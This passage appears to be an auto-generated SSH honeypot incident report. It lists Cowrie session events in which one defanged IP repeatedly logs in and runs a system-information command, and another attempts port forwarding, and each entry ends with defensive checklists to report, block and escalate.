| `2026-08-15 06:48:39` | `cowrie.session.connect` |
| `2026-08-15 06:48:39` | `cowrie.client.version` |
| `2026-08-15 06:48:39` | `cowrie.client.kex` |
| `2026-08-15 06:48:41` | `cowrie.login.success` |
| `2026-08-15 06:48:42` | `cowrie.session.params` |
| `2026-08-15 06:48:42` | `cowrie.command.input` |
| `2026-08-15 06:48:43` | `cowrie.log.closed` |
| `2026-08-15 06:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-895de5c8799a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:48 |
| **Last Seen** | 2026-08-15 06:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:48:45` | `cowrie.session.connect` |
| `2026-08-15 06:48:45` | `cowrie.client.version` |
| `2026-08-15 06:48:45` | `cowrie.client.kex` |
| `2026-08-15 06:48:47` | `cowrie.login.success` |
| `2026-08-15 06:48:49` | `cowrie.session.params` |
| `2026-08-15 06:48:49` | `cowrie.command.input` |
| `2026-08-15 06:48:49` | `cowrie.log.closed` |
| `2026-08-15 06:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccdddc6df2ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:48 |
| **Last Seen** | 2026-08-15 06:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:48:50` | `cowrie.session.connect` |
| `2026-08-15 06:48:51` | `cowrie.client.version` |
| `2026-08-15 06:48:51` | `cowrie.client.kex` |
| `2026-08-15 06:48:53` | `cowrie.login.success` |
| `2026-08-15 06:48:54` | `cowrie.session.params` |
| `2026-08-15 06:48:54` | `cowrie.command.input` |
| `2026-08-15 06:48:55` | `cowrie.log.closed` |
| `2026-08-15 06:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27ffac9a219a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:48 |
| **Last Seen** | 2026-08-15 06:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:48:56` | `cowrie.session.connect` |
| `2026-08-15 06:48:57` | `cowrie.client.version` |
| `2026-08-15 06:48:57` | `cowrie.client.kex` |
| `2026-08-15 06:48:58` | `cowrie.login.success` |
| `2026-08-15 06:49:00` | `cowrie.session.params` |
| `2026-08-15 06:49:00` | `cowrie.command.input` |
| `2026-08-15 06:49:00` | `cowrie.log.closed` |
| `2026-08-15 06:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8632d34dbda

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:49 |
| **Last Seen** | 2026-08-15 06:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:49:02` | `cowrie.session.connect` |
| `2026-08-15 06:49:03` | `cowrie.client.version` |
| `2026-08-15 06:49:03` | `cowrie.client.kex` |
| `2026-08-15 06:49:04` | `cowrie.login.success` |
| `2026-08-15 06:49:05` | `cowrie.session.params` |
| `2026-08-15 06:49:05` | `cowrie.command.input` |
| `2026-08-15 06:49:05` | `cowrie.log.closed` |
| `2026-08-15 06:49:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f359c4270b55

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:49 |
| **Last Seen** | 2026-08-15 06:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:49:08` | `cowrie.session.connect` |
| `2026-08-15 06:49:09` | `cowrie.client.version` |
| `2026-08-15 06:49:09` | `cowrie.client.kex` |
| `2026-08-15 06:49:10` | `cowrie.login.success` |
| `2026-08-15 06:49:11` | `cowrie.session.params` |
| `2026-08-15 06:49:11` | `cowrie.command.input` |
| `2026-08-15 06:49:11` | `cowrie.log.closed` |
| `2026-08-15 06:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5991ddc052fe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:49 |
| **Last Seen** | 2026-08-15 06:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:49:16` | `cowrie.session.connect` |
| `2026-08-15 06:49:16` | `cowrie.client.version` |
| `2026-08-15 06:49:16` | `cowrie.client.kex` |
| `2026-08-15 06:49:16` | `cowrie.login.success` |
| `2026-08-15 06:49:17` | `cowrie.session.params` |
| `2026-08-15 06:49:17` | `cowrie.command.input` |
| `2026-08-15 06:49:17` | `cowrie.log.closed` |
| `2026-08-15 06:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-026a72d4418c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:49 |
| **Last Seen** | 2026-08-15 06:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:49:22` | `cowrie.session.connect` |
| `2026-08-15 06:49:23` | `cowrie.client.version` |
| `2026-08-15 06:49:23` | `cowrie.client.kex` |
| `2026-08-15 06:49:24` | `cowrie.login.success` |
| `2026-08-15 06:49:24` | `cowrie.session.params` |
| `2026-08-15 06:49:24` | `cowrie.command.input` |
| `2026-08-15 06:49:25` | `cowrie.log.closed` |
| `2026-08-15 06:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b3ca7c14cdc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:49 |
| **Last Seen** | 2026-08-15 06:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:49:30` | `cowrie.session.connect` |
| `2026-08-15 06:49:30` | `cowrie.client.version` |
| `2026-08-15 06:49:30` | `cowrie.client.kex` |
| `2026-08-15 06:49:31` | `cowrie.login.success` |
| `2026-08-15 06:49:32` | `cowrie.session.params` |
| `2026-08-15 06:49:32` | `cowrie.command.input` |
| `2026-08-15 06:49:32` | `cowrie.log.closed` |
| `2026-08-15 06:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b40417341315

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:49 |
| **Last Seen** | 2026-08-15 06:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:49:36` | `cowrie.session.connect` |
| `2026-08-15 06:49:36` | `cowrie.client.version` |
| `2026-08-15 06:49:36` | `cowrie.client.kex` |
| `2026-08-15 06:49:37` | `cowrie.login.success` |
| `2026-08-15 06:49:38` | `cowrie.session.params` |
| `2026-08-15 06:49:38` | `cowrie.command.input` |
| `2026-08-15 06:49:39` | `cowrie.log.closed` |
| `2026-08-15 06:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9856e26f89a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:49 |
| **Last Seen** | 2026-08-15 06:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:49:42` | `cowrie.session.connect` |
| `2026-08-15 06:49:43` | `cowrie.client.version` |
| `2026-08-15 06:49:43` | `cowrie.client.kex` |
| `2026-08-15 06:49:44` | `cowrie.login.success` |
| `2026-08-15 06:49:45` | `cowrie.session.params` |
| `2026-08-15 06:49:45` | `cowrie.command.input` |
| `2026-08-15 06:49:46` | `cowrie.log.closed` |
| `2026-08-15 06:49:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52d79c872573

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:49 |
| **Last Seen** | 2026-08-15 06:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:49:48` | `cowrie.session.connect` |
| `2026-08-15 06:49:49` | `cowrie.client.version` |
| `2026-08-15 06:49:49` | `cowrie.client.kex` |
| `2026-08-15 06:49:50` | `cowrie.login.success` |
| `2026-08-15 06:49:51` | `cowrie.session.params` |
| `2026-08-15 06:49:51` | `cowrie.command.input` |
| `2026-08-15 06:49:52` | `cowrie.log.closed` |
| `2026-08-15 06:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-457cc1c3e0cb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:49 |
| **Last Seen** | 2026-08-15 06:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:49:54` | `cowrie.session.connect` |
| `2026-08-15 06:49:55` | `cowrie.client.version` |
| `2026-08-15 06:49:55` | `cowrie.client.kex` |
| `2026-08-15 06:49:56` | `cowrie.login.success` |
| `2026-08-15 06:49:57` | `cowrie.session.params` |
| `2026-08-15 06:49:57` | `cowrie.command.input` |
| `2026-08-15 06:49:57` | `cowrie.log.closed` |
| `2026-08-15 06:49:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbeb08aabecb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:50 |
| **Last Seen** | 2026-08-15 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:50:01` | `cowrie.session.connect` |
| `2026-08-15 06:50:01` | `cowrie.client.version` |
| `2026-08-15 06:50:01` | `cowrie.client.kex` |
| `2026-08-15 06:50:01` | `cowrie.login.success` |
| `2026-08-15 06:50:03` | `cowrie.session.params` |
| `2026-08-15 06:50:03` | `cowrie.command.input` |
| `2026-08-15 06:50:03` | `cowrie.log.closed` |
| `2026-08-15 06:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-096e5be254fd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:50 |
| **Last Seen** | 2026-08-15 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:50:06` | `cowrie.session.connect` |
| `2026-08-15 06:50:06` | `cowrie.client.version` |
| `2026-08-15 06:50:06` | `cowrie.client.kex` |
| `2026-08-15 06:50:07` | `cowrie.login.success` |
| `2026-08-15 06:50:08` | `cowrie.session.params` |
| `2026-08-15 06:50:08` | `cowrie.command.input` |
| `2026-08-15 06:50:09` | `cowrie.log.closed` |
| `2026-08-15 06:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77c5719794c9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:50 |
| **Last Seen** | 2026-08-15 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:50:12` | `cowrie.session.connect` |
| `2026-08-15 06:50:12` | `cowrie.client.version` |
| `2026-08-15 06:50:12` | `cowrie.client.kex` |
| `2026-08-15 06:50:13` | `cowrie.login.success` |
| `2026-08-15 06:50:15` | `cowrie.session.params` |
| `2026-08-15 06:50:15` | `cowrie.command.input` |
| `2026-08-15 06:50:15` | `cowrie.log.closed` |
| `2026-08-15 06:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fe35c2b569c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:50 |
| **Last Seen** | 2026-08-15 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:50:18` | `cowrie.session.connect` |
| `2026-08-15 06:50:18` | `cowrie.client.version` |
| `2026-08-15 06:50:18` | `cowrie.client.kex` |
| `2026-08-15 06:50:19` | `cowrie.login.success` |
| `2026-08-15 06:50:20` | `cowrie.session.params` |
| `2026-08-15 06:50:20` | `cowrie.command.input` |
| `2026-08-15 06:50:20` | `cowrie.log.closed` |
| `2026-08-15 06:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f459edb58f1d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:50 |
| **Last Seen** | 2026-08-15 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:50:24` | `cowrie.session.connect` |
| `2026-08-15 06:50:24` | `cowrie.client.version` |
| `2026-08-15 06:50:24` | `cowrie.client.kex` |
| `2026-08-15 06:50:25` | `cowrie.login.success` |
| `2026-08-15 06:50:26` | `cowrie.session.params` |
| `2026-08-15 06:50:26` | `cowrie.command.input` |
| `2026-08-15 06:50:26` | `cowrie.log.closed` |
| `2026-08-15 06:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0cae47cbeb2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:50 |
| **Last Seen** | 2026-08-15 06:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:50:30` | `cowrie.session.connect` |
| `2026-08-15 06:50:30` | `cowrie.client.version` |
| `2026-08-15 06:50:30` | `cowrie.client.kex` |
| `2026-08-15 06:50:32` | `cowrie.login.success` |
| `2026-08-15 06:50:34` | `cowrie.session.params` |
| `2026-08-15 06:50:34` | `cowrie.command.input` |
| `2026-08-15 06:50:34` | `cowrie.log.closed` |
| `2026-08-15 06:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e12a715a4bb0

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-08-15 06:50 |
| **Last Seen** | 2026-08-15 06:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:50:34` | `cowrie.session.connect` |
| `2026-08-15 06:50:34` | `cowrie.client.version` |
| `2026-08-15 06:50:34` | `cowrie.client.kex` |
| `2026-08-15 06:50:36` | `cowrie.login.success` |
| `2026-08-15 06:50:37` | `cowrie.direct-tcpip.request` |
| `2026-08-15 06:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c1fef1f052f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:50 |
| **Last Seen** | 2026-08-15 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:50:35` | `cowrie.session.connect` |
| `2026-08-15 06:50:35` | `cowrie.client.version` |
| `2026-08-15 06:50:35` | `cowrie.client.kex` |
| `2026-08-15 06:50:37` | `cowrie.login.success` |
| `2026-08-15 06:50:37` | `cowrie.session.params` |
| `2026-08-15 06:50:37` | `cowrie.command.input` |
| `2026-08-15 06:50:37` | `cowrie.log.closed` |
| `2026-08-15 06:50:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e70f8ae43f6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:50 |
| **Last Seen** | 2026-08-15 06:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:50:41` | `cowrie.session.connect` |
| `2026-08-15 06:50:41` | `cowrie.client.version` |
| `2026-08-15 06:50:41` | `cowrie.client.kex` |
| `2026-08-15 06:50:42` | `cowrie.login.success` |
| `2026-08-15 06:50:44` | `cowrie.session.params` |
| `2026-08-15 06:50:44` | `cowrie.command.input` |
| `2026-08-15 06:50:44` | `cowrie.log.closed` |
| `2026-08-15 06:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8643fee66ec

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:50 |
| **Last Seen** | 2026-08-15 06:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:50:46` | `cowrie.session.connect` |
| `2026-08-15 06:50:47` | `cowrie.client.version` |
| `2026-08-15 06:50:47` | `cowrie.client.kex` |
| `2026-08-15 06:50:48` | `cowrie.login.success` |
| `2026-08-15 06:50:49` | `cowrie.session.params` |
| `2026-08-15 06:50:49` | `cowrie.command.input` |
| `2026-08-15 06:50:50` | `cowrie.log.closed` |
| `2026-08-15 06:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96efa8cb2ac5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:50 |
| **Last Seen** | 2026-08-15 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:50:52` | `cowrie.session.connect` |
| `2026-08-15 06:50:52` | `cowrie.client.version` |
| `2026-08-15 06:50:52` | `cowrie.client.kex` |
| `2026-08-15 06:50:54` | `cowrie.login.success` |
| `2026-08-15 06:50:55` | `cowrie.session.params` |
| `2026-08-15 06:50:55` | `cowrie.command.input` |
| `2026-08-15 06:50:55` | `cowrie.log.closed` |
| `2026-08-15 06:50:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4226c127d4f9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:50 |
| **Last Seen** | 2026-08-15 06:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:50:58` | `cowrie.session.connect` |
| `2026-08-15 06:50:58` | `cowrie.client.version` |
| `2026-08-15 06:50:58` | `cowrie.client.kex` |
| `2026-08-15 06:50:59` | `cowrie.login.success` |
| `2026-08-15 06:51:01` | `cowrie.session.params` |
| `2026-08-15 06:51:01` | `cowrie.command.input` |
| `2026-08-15 06:51:01` | `cowrie.log.closed` |
| `2026-08-15 06:51:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c96038e9a947

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:51 |
| **Last Seen** | 2026-08-15 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:51:04` | `cowrie.session.connect` |
| `2026-08-15 06:51:04` | `cowrie.client.version` |
| `2026-08-15 06:51:04` | `cowrie.client.kex` |
| `2026-08-15 06:51:05` | `cowrie.login.success` |
| `2026-08-15 06:51:06` | `cowrie.session.params` |
| `2026-08-15 06:51:06` | `cowrie.command.input` |
| `2026-08-15 06:51:06` | `cowrie.log.closed` |
| `2026-08-15 06:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03af1087e78e

| Field | Detail |
|---|---|
